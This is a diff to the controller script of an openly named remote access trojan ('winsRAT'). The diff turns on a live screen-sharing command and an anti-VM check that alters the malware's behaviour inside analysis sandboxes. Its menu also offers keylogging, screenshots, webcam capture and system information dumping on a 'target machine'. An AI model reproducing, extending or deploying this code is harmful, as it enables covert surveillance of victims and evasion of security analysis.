@@ -12,24 +12,25 @@ import threading
 import platform
 import queue
 import pickle
+from io import BytesIO
+from PIL import Image
 import PyInstaller.__main__
 from datetime import datetime
 
 __LOGO__ = r"""
 
-echo " _____                                            _____ ";
-echo "( ___ )------------------------------------------( ___ )";
-echo " |   |                                            |   | ";
-echo " |   |                                            |   | ";
-echo " |   |    ____  _ _ _       ____      _  _____    |   | ";
-echo " |   |   / ___|(_) | |_   _|  _ \    / \|_   _|   |   | ";
-echo " |   |   \___ \| | | | | | | |_) |  / _ \ | |     |   | ";
-echo " |   |    ___) | | | | |_| |  _ <  / ___ \| |     |   | ";
-echo " |   |   |____/|_|_|_|\__, |_| \_\/_/   \_\_|     |   | ";
-echo " |   |                |___/                       |   | ";
-echo " |   |                                            |   | ";
-echo " |___|                                            |___| ";
-echo "(_____)------------------------------------------(_____)";
+echo "+=======================================================================+";
+echo "|  (`\ .-') /`            .-') _   .-')   _  .-')     ('-.     .-') _   |";
+echo "|   `.( OO ),'           ( OO ) ) ( OO ).( \( -O )   ( OO ).-.(  OO) )  |";
+echo "|,--./  .--.  ,-.-') ,--./ ,--,' (_)---\_),------.   / . --. //     '._ |";
+echo "||      |  |  |  |OO)|   \ |  |\ /    _ | |   /`. '  | \-.  \ |'--...__)|";
+echo "||  |   |  |, |  |  \|    \|  | )\  :` `. |  /  | |.-'-'  |  |'--.  .--'|";
+echo "||  |.'.|  |_)|  |(_/|  .     |/  '..`''.)|  |_.' | \| |_.'  |   |  |   |";
+echo "||         | ,|  |_.'|  |\    |  .-._)   \|  .  '.'  |  .-.  |   |  |   |";
+echo "||   ,'.   |(_|  |   |  | \   |  \       /|  |\  \   |  | |  |   |  |   |";
+echo "|'--'   '--'  `--'   `--'  `--'   `-----' `--' '--'  `--' `--'   `--'   |";
+echo "+=======================================================================+";
+
 
                     %s v2.1 @hash3liZer/@TheFlash2k
                        Improve by ThemeHackers
@@ -152,9 +153,9 @@ class PULL:
             ('keylogger', 'KeyLogger Module'),
             ('sysinfo', 'Dump System, Processor, CPU and Network Information'),
             ('screenshot', 'Take Screenshot on Target Machine and Save on Local'),
-            # ('screenshare' , 'Take Screenshot on Target Machine and Share in Real Time'),
+            ('screenshare' , 'Take Screenshot on Target Machine and Share in Real Time'),
             ('webcam', 'Capture Webcam Image and Save on Local'),
-            # ('antivm' , 'Check if the target is a VM to change the behavior of winsRAT.'),
+            ('antivm' , 'Check if the target is a VM to change the behavior of winsRAT.'),
             ('exit', 'Exit from winsRAT!')
             
             
@@ -578,21 +579,26 @@ class COMMCENTER:
         else:
             pull.error("You need to connect before execute this command!")
 
+    def c_antivm(self):
+        if self.CURRENT:
+            self.CURRENT[1].send_data("antivm:")
+            result = self.CURRENT[1].recv_data()
+            if result.strip(" "):
+                print(result)
+        else:
+            pull.error("You need to connect before execute this command!")
 
+    def c_screenshare(self):
+        if not self.CURRENT:
+            print("You need to connect before executing this command!")
+            return
 
-    def c_screenshare(sock):
-        from mods.screenshare import ScreenShareServer  
-        
-        ssc = ScreenShareServer()
-        ssc.start_server()  
-        
-    def c_antivm(sock):
-        from mods.antivm import AntiVM
-        
-        detected = AntiVM.detect(verbose=True)
-        resp = "[OK] No VM detected." if not detected else "[!] VM detected."
-        sock.send(base64.b64encode(resp.encode()) + b")J@NcRfU")
-
+        try:
+            self.CURRENT[1].send_data("screenshare")  
+            stream_url = self.CURRENT[1].recv_data()  
+            print(f"[+] Client live screenshare available at: {stream_url}")
+        except Exception as e:
+            print(f"[!] Error during screenshare: {e}")
 
     def c_exit(self):
         sys.stdout.write("\n")
@@ -986,5 +992,4 @@ if __name__ == "__main__":
         pull.exit("Exiting ...")
     except Exception as e:
         pull.error("An error occurred: %s" % str(e))
-
         sys.exit(1)
